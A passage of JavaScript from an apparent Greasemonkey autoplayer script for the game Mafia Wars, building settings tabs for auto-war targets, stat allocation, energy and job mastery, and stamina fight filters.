  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Publish reward'));

  // War mode
  id = 'warMode';
  var warModes = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=warModeChoices.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(warModeChoices[i]));
    warModes.appendChild(choice);
  }
  warModes.selectedIndex = GM_getValue('warMode', 0);
  makeElement('div', rhs, {'class':'hide', 'style':'height: 5px;'});

  // War - autowar targets
  title = 'Enter opponents Mafia Wars ID';
  id = 'autoWarTargetList';

  var warListLabel = makeElement('font', rhs, {'style':'font-size: 10px;'});
  warListLabel.appendChild(document.createTextNode('Enter each target on a separate line. Add the userid part of the p|userid.'));
  makeElement('br', rhs, {'class':'hide'});
  var warList = makeElement('textarea', rhs, {'style':'width: 12em; height: 6em;', 'id':id, 'title':'Enter each Mafia Wars ID on a separate line. This will not work with the Facebook ID.'});
  warList.appendChild(document.createTextNode(GM_getValue('autoWarTargetList', '')));
  makeElement('br', rhs, {'class':'hide'});

  // Hide list if war mode is random
  var warModeHandler = function () {
    warList.style.display = warModes.selectedIndex == 0 ? 'none' : '';
    warListLabel.style.display = warModes.selectedIndex == 0 ? 'none' : '';
  };
  warModeHandler();
  warModes.addEventListener('change', warModeHandler, false);

  return mafiaTab;
}

// Create Autostat Tab
function createAutostatTab() {
  var title, id, label, i, j, choice, div;
  var autostatTab = makeElement('div', null, {'id':'autostatTab', 'class':'tabcontent', 'style':'background-image:url(' + stripURI(bgTabImage) + ')'});

  var statDiv = makeElement('div', autostatTab, {'style':'position: absolute; width: 100%; left: 10px; top: 10px;'});

  id = 'autoStat';
  title = 'Check this this to enable auto-statting';
  var autoStats = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; left: 20px;'});
  makeElement('input', autoStats, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('img', autoStats, {'src':stripURI(plussignIcon)});
  makeElement('label', autoStats, {'for':id, 'title':title}).appendChild(document.createTextNode(' Enable auto-stat'));

  title = ' Disable AutoStat when status goals are reached';
  id = 'autoStatDisable';
  var divStatDisable = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; left: 200px; '});
  makeElement('input', divStatDisable, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', divStatDisable, {'for':id, 'title':title}).appendChild(document.createTextNode(title));

  // Display Adjustments
  var xTop = 30;
  var yLeft = 10;

  // Status Labels
  var yLeftCur = yLeft + 20;
  var xTopCur = xTop +2;

  // Stat labels
  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i ) {
    div = makeElement('div', statDiv, {'style':'position: absolute; top:' + xTopCur + 'px; left:' + yLeftCur + 'px;'});
    div.appendChild(document.createTextNode(autoStatDescrips[i + 1]));

    xTopCur += 25;
  }

  // Status ratio
  yLeftCur = yLeft + 75;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i ) {
    title = 'Please set ratio of' + autoStatDescrips[i + 1] + ' stat';
    id = autoStatRatios[i];
    div = makeElement('div', statDiv, {'style':'position: absolute; top:' + xTopCur + 'px; left:' + yLeftCur + 'px;'});
    div.appendChild(document.createTextNode(' = '));
    makeElement('input', div, {'type':'text', 'style':'width: 40px;', 'value':GM_getValue(id, 0), 'id':id, 'size':'1'});
    div.appendChild(document.createTextNode(' x '));

    xTopCur += 25;
  }

  // Status Allocation Mode Settings
  yLeftCur = yLeft + 150;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatModes.length; i < iLength; ++i ) {
    title = 'Please select where to base ' + autoStatDescrips[i + 1] + ' stat';
    id = autoStatModes[i];
    var sel = makeElement('select', statDiv, {'id':id, 'title':title, 'style':'position: absolute; width:60px; top: ' + xTopCur + 'px; left: ' + yLeftCur + 'px;'});
    xTopCur += 25;
    for (j = 0, jLength=autoStatDescrips.length; j < jLength; ++j) {
      choice = document.createElement('option');
      choice.value = j;
      choice.appendChild(document.createTextNode(autoStatDescrips[j]));
      sel.appendChild(choice);
    }
    sel.selectedIndex = GM_getValue(autoStatModes[i], 0);
  }

  // Status base
  yLeftCur = yLeft + 215;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i ) {
    id = autoStatBases[i];
    div = makeElement('div', statDiv, {'style':'position: absolute; top:' + xTopCur + 'px; left:' + yLeftCur + 'px;'});
    div.appendChild(document.createTextNode(' + '));
    makeElement('input', div, {'type':'text', 'style':'width: 40px;', 'value':GM_getValue(id, 0), 'id':id, 'size':'1'});
    xTopCur += 25;
  }

  // Left-over points
  yLeftCur = yLeft + 280;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatFallbacks.length; i < iLength; ++i ) {
    title = 'Check this to distribute points to ' + autoStatDescrips[i + 1] + ' when goals are reached';
    id = autoStatFallbacks[i];
    div = makeElement('div', statDiv, {'style':'position: absolute; top: ' + xTopCur + 'px; left:' + yLeftCur + 'px; '});
    makeElement('input', div, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, autoStatFallbacks[i]);
    label = makeElement('label', div, {'for':id, 'title':title});
    label.appendChild(document.createTextNode(' ' + autoStatDescrips[i+1] + ' as fallback'));
    xTopCur += 25;
  }

  // Priority Settings
  title = 'Please select priority level for stat distribution';
  yLeftCur = yLeft + 460;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatPrios.length; i < iLength; ++i ) {
    id = autoStatPrios[i];
    sel = makeElement('select', statDiv, {'id':id, 'title':title,'style':'position: absolute; top: ' + xTopCur + 'px; left: ' + yLeftCur + 'px;'});
    xTopCur += 25;
    for (j = 0, jLength=autoStatRatios.length; j < jLength; ++j) {
      choice = document.createElement('option');
      choice.value = j;
      choice.appendChild(document.createTextNode('Priority ' + (j + 1)));
      sel.appendChild(choice);
    }
    sel.selectedIndex = GM_getValue(autoStatPrios[i], 0);
  }

  /*
  id = 'autoMainframe';
  title = 'Check this to enable auto-code for the mainframe';
  var autoMainframe = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 175px; left: 20px;'});
  makeElement('input', autoMainframe, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', autoMainframe, {'for':id, 'title':title}).appendChild(document.createTextNode(' Enable auto-Mainframe'));
  title = 'Enter mainframe code';
  id = 'autoMainframeCode';
  makeElement('input', autoMainframe, {'type':'text', 'style':'width: 80px;margin-left:5px; text-align: right', 'title':title, 'value':GM_getValue(id, ''), 'id':id, 'size':'12'});
*/
  id = 'autoResetTimers';
  title = 'Check this to reset timers on PS MWAP startup';
  var autoResetTimers = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 200px; left: 20px;'});
  makeElement('input', autoResetTimers, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', autoResetTimers, {'for':id, 'title':title}).appendChild(document.createTextNode(' Enable auto-ResetTimers'));

  id = 'autoDailyChecklist';
  title = 'Check this to have PS MWAP click through the daily checklist items';
  var autoDailyChecklist = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 225px; left: 20px;'});
  makeElement('input', autoDailyChecklist, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', autoDailyChecklist, {'for':id, 'title':title}).appendChild(document.createTextNode(' Enable auto-Daily Checklist'));

  // Enforce Title

  id = 'autoEnforcedTitle';
  title = 'Change your MW title';
  var autoEnforcedTitleSelect = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; top: 250px; left: 20px;width:95%;'});
  makeElement('label', autoEnforcedTitleSelect, {'for':id, 'title':title}).appendChild(document.createTextNode('Enforce a New Title : '));

  var autoEnforcedTitle = makeElement('select', autoEnforcedTitleSelect, {'id':id, 'title':title, 'style':'margin-left:0.5em'});
  chooseTitle = document.createElement('option');
  chooseTitle.text = 'Do not Enforce a New Title';
  chooseTitle.value = '';
  if (GM_getValue('autoEnforcedTitle') == '') chooseTitle.selected = true;
  autoEnforcedTitle.appendChild(chooseTitle);

  for(i=0, iLength = mwTitles.length;i < iLength;++i){
    chooseTitle = document.createElement('option');
    chooseTitle.text = mwTitles[i];
    chooseTitle.value = mwTitles[i];
    if (GM_getValue('autoEnforcedTitle') == mwTitles[i]) chooseTitle.selected = true;
    autoEnforcedTitle.appendChild(chooseTitle);
  }

  title = 'Enter the number of hours to wait before changing the title again. Has to be at least 1 hour, and can be decimal (e.g. 1.5).';
  id = 'autoEnforcedTitleTime';
  makeElement('label', autoEnforcedTitleSelect, {'for':id, 'title':title,'style':'margin-left: 200px;'}).appendChild(document.createTextNode(' every '));
  makeElement('input', autoEnforcedTitleSelect, {'type':'text', 'value':GM_getValue(id, '2'), 'title':title, 'id':id, 'size':'1'});
  autoEnforcedTitleSelect.appendChild(document.createTextNode(' hour(s)'));

  return autostatTab;
}

// Create Energy Tab
function createEnergyTab() {
  var elt, title, id, label, item, rhs, lhs, choice;
  var energyTab = makeElement('div', null, {'id':'energyTab', 'class':'tabcontent', 'style':'background-image:url(' + stripURI(bgTabImage) + ')'});

  // Container for a list of settings.
  var list = makeElement('div', energyTab, {'style':'position: relative; top: 0px; margin-left: auto; margin-right: auto; width: 95%; line-height:120%;'});

  // How to spend energy
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Spend energy automatically.';
  id = 'autoMission';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'autoMission');
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Spend energy to:'));
  title = ' Master jobs one at a time';
  id = 'masterAllJobs';
  label = makeElement('label', rhs, {'for':id, 'title':title});
  var masterAllJobs = makeElement('input', label, {'type':'radio', 'name':'r5', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, id);
  //masterAllJobs.defaultChecked = true;
  label.appendChild(document.createTextNode(title));
  makeElement('br', rhs);
  title = ' Perform any combination of jobs';
  id = 'multipleJobs';
  label = makeElement('label', rhs, {'for':id, 'title':title});
  var multipleJobs = makeElement('input', label, {'type':'radio', 'name':'r5', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, id);
  label.appendChild(document.createTextNode(title + ' '));
  var unChkAll = makeElement('input', label, {'id':'unCheckAll','style':'font-size: 9px;' + ((isGMChecked('multipleJobs')) ? '':' display: none;'),'type':'button', 'value':'Uncheck All'});

  // Job bursts
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Performs bursts of jobs';
  id = 'burstJob';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Enable job bursts:'));

  title = 'How many times to do job bursts';
  id = 'burstJobCount';
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Fire '));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '2')});
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' job attempts everytime'));

  //
  // Job selector.
  //
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = '...set by handler...';
  id = 'selectMission';
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('...set by handler...'));

  var selectMissionM = makeElement('div', rhs, {'id':id + 'M', 'title':title, 'style':'overflow: auto; width: 300px; height: 150px; border:1px solid #999999; padding: 2px 2px 2px 2px'});
  var selectMissionS = makeElement('select', rhs, {'id':id + 'S', 'title':title, 'style':'width: 300px;'});
  var selectMissionLabel = label;

  // Optimize at end level option
  var jobOptions = makeElement('div', lhs, {'id':'jobOptions'});
  id = 'endLevelOptimize';
  title = 'Optimize at end level';
  makeElement('br', jobOptions);
  makeElement('input', jobOptions, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, id);
  label = makeElement('label', jobOptions, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' ' + title));

  // Master tier selection pull down.
  var selectTierDiv = makeElement('div', list);
  lhs = makeElement('div', selectTierDiv, {'class':'lhs'});
  rhs = makeElement('div', selectTierDiv, {'class':'rhs'});
  makeElement('br', selectTierDiv, {'class':'hide'});
  title = 'Master Tier';
  id = 'selectTier';
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Master tier:'));
  var selectTier = makeElement('select', rhs, {'id':id, 'title':title});
  choiceTier = document.createElement('option');
  choiceTier.text = 'Do not master anything';
  choiceTier.value = '0.0';
  selectTier.appendChild(choiceTier);

  // Create the rows of the list.
  var cityno = -1;
  var tabno = -1;
  var divChoice, choiceM, choiceS;

  var chkHandler = function () {
    var eltId = this.getAttribute('chkId');
    var chkElt = document.getElementById(eltId);
    var chkImgElt = document.getElementById('img' + eltId);

    if (chkElt) {
      if(chkElt.checked) {
        chkElt.checked = false;
        chkImgElt.src=stripURI(unCheckedIcon);
      } else {
        chkElt.checked = 'checked';
        chkImgElt.src=stripURI(checkedIcon);
      }
    }
  };

  var tmpListArray = getSavedList('selectMissionMultiple');

  for (var i = 0, iLength=missions.length; i < iLength; ++i) {
    var mission = missions[i];
    if (mission[MISSION_CITY] != cityno) {
      // Add a row for the city.
      cityno = mission[MISSION_CITY];
      choiceM = makeElement('div');
      choiceM.innerHTML = '=== ' + cities[cityno][CITY_NAME].toUpperCase() + ' MISSIONS ===';
      choiceM.className = 'ap_optgroup1';
      selectMissionM.appendChild(choiceM);

      choiceS = document.createElement('optgroup');
      choiceS.label = '=== ' + cities[cityno][CITY_NAME].toUpperCase() + ' MISSIONS ===';
      choiceS.className = 'ap_optgroup1';
      selectMissionS.appendChild(choiceS);

      choiceTier = document.createElement('optgroup');
      choiceTier.label = cities[cityno][CITY_NAME].toUpperCase();
      choiceTier.className = 'ap_optgroup1';
      selectTier.appendChild(choiceTier);
    }
    if (mission[MISSION_TAB] != tabno) {
      // Add a row for the tab.
      tabno = mission[MISSION_TAB];
      choiceM = makeElement('div');
      choiceM.innerHTML = missionTabs[cityno][tabno - 1];
      choiceM.className = 'ap_optgroup2';
      selectMissionM.appendChild(choiceM);

      choiceS = document.createElement('optgroup');
      choiceS.label = missionTabs[cityno][tabno - 1];
      choiceS.className = 'ap_optgroup2';
      selectMissionS.appendChild(choiceS);

      choiceTier = document.createElement('option');
      choiceTier.text = missionTabs[cityno][tabno - 1];
      choiceTier.value = cityno + '.' + tabno;
      selectTier.appendChild(choiceTier);
      if (GM_getValue('selectTier') == choiceTier.value) {
        choiceTier.selected = true;
      }
    }

    // Determine the job's experience-to-energy ratio.
    var ratio = isNaN(mission[MISSION_RATIO]) ? calcJobratio(i) : mission[MISSION_RATIO];

    // Add a row for the job.
    id = missions[i][MISSION_NAME];
    title = mission[MISSION_NAME] + ' (' + parseFloat(ratio) + ')';

    // Get the check state of the box
    var checkState = false;
    if (tmpListArray.indexOf(String(i)) != -1) {
      checkState = true;
    }

    // Multiple job choices
    divChoice = makeElement('div', null, {'class':'ap_option', 'chkid':id});
    divChoice.addEventListener('click', chkHandler, false);
    makeElement('img', divChoice, {'style':'width: 15px; height: 15px;', 'id':'img' + id, 'src': checkState ? stripURI(checkedIcon) : stripURI(unCheckedIcon)});
    choiceM = makeElement('input', divChoice, {'type':'checkbox', 'id':id, 'title':title, 'style':'display: none', 'value':'checked'});
    choiceM.checked = checkState;
    divChoice.appendChild(document.createTextNode(' ' + title));
    selectMissionM.appendChild(divChoice);

    // Single job choices
    choiceS = document.createElement('option');
    choiceS.text = mission[MISSION_NAME] + ' (' + parseFloat(ratio) + ')';
    choiceS.className = 'ap_option';
    selectMissionS.appendChild(choiceS);
  }
  selectMissionS.selectedIndex = GM_getValue('selectMission', 1);

  // Uncheck ALL handler
  var unChkHandler = function () {
    var eltChoice;
    var eltChoiceImg;
    var eltId;
    for (var i = 0, iLength=missions.length; i < iLength; ++i) {
      eltId = missions[i][MISSION_NAME];
      eltChoice = document.getElementById(eltId);
      eltChoiceImg = document.getElementById('img' + eltId);
      if (eltChoiceImg && eltChoice.checked) eltChoiceImg.src = stripURI(unCheckedIcon);
      if (eltChoice && eltChoice.checked) eltChoice.checked = false;
    }
  };
  unChkAll.addEventListener('click', unChkHandler, false);

  // Handler to change selection style (multiple vs. single)
  var handler = function() {
    var title, labelText;
    if (multipleJobs.checked) {
      labelText = 'Job selection:';
      title = 'Select one or more jobs to perform. Jobs will be performed in an automatically optimized order.';
      selectMissionLabel.firstChild.nodeValue = labelText;
      selectMissionLabel.title = title;
      selectMissionM.title = title;
      selectMissionM.style.display = '';
      selectMissionS.style.display = 'none';
      jobOptions.style.display = '';
      selectTierDiv.style.display = '';
    } else {
      labelText = 'Next job to master:';
      title = 'Select the next job to master. Once mastered, another job will be picked automatically.';
      selectMissionLabel.firstChild.nodeValue = labelText;
      selectMissionLabel.title = title;
      selectMissionS.title = title;
      selectMissionM.style.display = 'none';
      selectMissionS.style.display = '';
      jobOptions.style.display = 'none';
      selectTierDiv.style.display = 'none';
    }

    var unChkElt = document.getElementById('unCheckAll');
    if (unChkElt) unChkAll.style.display = multipleJobs.checked ? '' : 'none';
  };
  handler();

  masterAllJobs.addEventListener('change', handler, false);
  multipleJobs.addEventListener('change', handler, false);

  // skip stamina spending jobs
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'skipfight';
  title = 'Check this to skip Fighting Style Jobs In Tier Mastery.';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(' Skip Fighting In Job Tier Mastery '));

  // Spend buff packs?
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Spend buff packs:'));

  // Mini packs
  title = 'Periodically check for mini buffs.';
  id = 'checkMiniPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'checkMiniPack');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Mini packs '));
  makeElement('br', item, {'class':'hide'});

  // Energy packs
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  title = 'Spend energy packs if it will not waste energy, as determined by the estimated job ratio setting and your stamina statistics.';
  id = 'autoEnergyPack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'autoEnergyPack');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  title = 'Estimate the average experience-to-energy ratio of the jobs you will be performing. For example, a job that paid 10 experience points and required 5 energy would have a ratio of 2. Enter 0 if you prefer to have energy packs fire regardless of waste.';
  id = 'estimateJobRatio';
  label.appendChild(document.createTextNode(' Full packs @ ratio '));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':4, 'style':'vertical-align:middle; width: 30px; border: #781351;', 'value':GM_getValue('estimateJobRatio', '1'), 'size':'1'});
  makeElement('br', item, {'class':'hide'});

  // Energy packs force
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  title = 'Spend energy packs if you have less than the set amount of energy.';
  id = 'autoEnergyPackForce';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'autoEnergyPackForce');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  title = 'Amount of energy remaining to trigger the firing of the energy pack.';
  id = 'autoEnergyPackForcePts';
  label.appendChild(document.createTextNode(' Full packs @ points '));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':4, 'style':'vertical-align:middle; width: 30px; border: #781351;', 'value':GM_getValue('autoEnergyPackForcePts', '0'), 'size':'1'});

  // Maniac character type?
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check this box if your character type is Maniac (as opposed to Fearless or Mogul).';
  id = 'isManiac';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Character type is Maniac'));

  // Mastery items owned.
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check the mastery items you already own.',
  label = makeElement('label', lhs, {'title':title});
  label.appendChild(document.createTextNode('Job mastery items owned:'));
  title = 'Check this if you were awarded the Helicopter for mastering all Consigliere jobs.';
  id = 'hasHelicopter';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'hasHelicopter');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Helicopter  '));
  title = 'Check this if you were awarded the Golden Throne for mastering all Boss jobs.';
  id = 'hasGoldenThrone';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'hasGoldenThrone');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Golden Throne'));

  // Spend energy option
  item = makeElement('div', list, {'class':'single'});
  title = 'Start spending energy when energy level is reached';
  id = 'selectEnergyUse';
  item.appendChild(document.createTextNode('Start spending energy when '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectEnergyUseMode';
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' of energy has accumulated.'));

  // Stamina to reserve for manual play
  item = makeElement('div', list, {'class':'single'});
  title = 'Suspend automatic play below this level of energy.';
  id = 'selectEnergyKeep';
  item.appendChild(document.createTextNode('Reserve '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectEnergyKeepMode';
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' of energy for manual play.'));

  // Level up
  item = makeElement('div', list, {'class':'single'});
  title = 'Ignore minimum energy settings if a level up is within reach.';
  id = 'allowEnergyToLevelUp';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', item, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Don\'t reserve energy if within reach of the next level.'));

  return energyTab;
}

// Create Stamina Tab
// Create Stamina Sub Tab Functions
function tabContainerDivs(subTab){
  item = makeElement('div', subTab);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
}

function removeStrongerOpponents(staminaTabSub){
  tabContainerDivs(staminaTabSub);
  title = 'Remove stronger opponents from the list automatically.';
  id = 'fightRemoveStronger';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'fightRemoveStronger', 'checked');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Remove stronger opponents'));
}

function staminaBursting(staminaTabSub){
// Enable Stamina bursts
  tabContainerDivs(staminaTabSub);
  id = 'burstStamina';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Enable bursts:'));
  // Burst Points
  title = 'How many points to burst';
  id = 'burstPoints';
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Burn '));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; border: 1px solid #781351;', 'value':GM_getValue(id, '3')});
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' points '));
  // Burstmode
  id = 'burstMode';
  var burstMode = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=burstModes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(burstModes[i]));
    burstMode.appendChild(choice);
  }
  burstMode.selectedIndex = GM_getValue(id, BURST_WIN);
  // Powerattack
  title = 'Power Attack';
  id = 'staminaPowerattack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});
  label.appendChild(document.createTextNode('Powerattack'));
}

// Create Stamina Sub Tabs
function createStaminaSubTab_FightRandom(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  makeElement('label', lhs).appendChild(document.createTextNode('Fight in: '));
  id = 'fightRandomLoc';
  var fightRandomLoc = makeElement('select', lhs, {'id':id});
  for (i = 0, iLength=fightLocations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(fightLocations[i]));
    fightRandomLoc.appendChild(choice);
  }
  fightRandomLoc.selectedIndex = GM_getValue('fightLocation', NY);

  //rehit on money gain
  title = 'Reattack until iced if money gained';
  id = 'staminaReattack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});
  label.appendChild(document.createTextNode('While gaining $ '));
  //Money gain treshold
  title = 'Reattack if this amount is gained';
  id = 'reattackThreshold';
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':6, 'style':'width: 45px; border: 1px solid #781351;', 'value':GM_getValue(id, '65000'), 'size':'1'});
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});

  // IceCheck
  title = 'Attack ONLY live targets';
  id = 'iceCheck';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'iceCheck');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Skip iced targets'));

  //Replaces old stamina settings insert
  staminaBursting(staminaTabSub);

  // Maximum level.
  tabContainerDivs(staminaTabSub);
  title = 'Avoid opponents higher than this level.';
  id = 'fightLevelMax';
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Maximum level:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':5, 'style':'width: 30px; border: 1px solid #781351;', 'value':GM_getValue('fightLevelMax', '100'), 'size':'1'});

  // Maximum level relative?
  title = 'Make the maximum level be relative to your own. For example, if your level is 10, and maximum level is set to 5, opponents higher than level 15 will be avoided.';
  id = 'fightLevelMaxRelative';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightLevelMaxRelative');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Add my level'));

  // Maximum mafia size.
  tabContainerDivs(staminaTabSub);
  id = 'fightMafiaMax';
  title = 'Avoid opponents with mafia sizes larger than this.',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Maximum mafia:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 30px; border: 1px solid #781351;', 'value':GM_getValue('fightMafiaMax', '501'), 'size':'1'});

  // Maximum mafia relative?
  title = 'Make the maximum mafia size be relative to your own. For example, if you have 300 mafia members, and maximum mafia is set to 50, opponents with more than 350 mafia members will be avoided.';
  id = 'fightMafiaMaxRelative';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightMafiaMaxRelative');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Add my mafia size'));

  // Minimum mafia size.
  tabContainerDivs(staminaTabSub);
  id = 'fightMafiaMin';
  title = 'Avoid opponents with mafia sizes smaller than this.',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Minimum mafia:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 30px; border: 1px solid #781351;', 'value':GM_getValue('fightMafiaMin', '1'), 'size':'1'});

  // Minimum mafia relative?
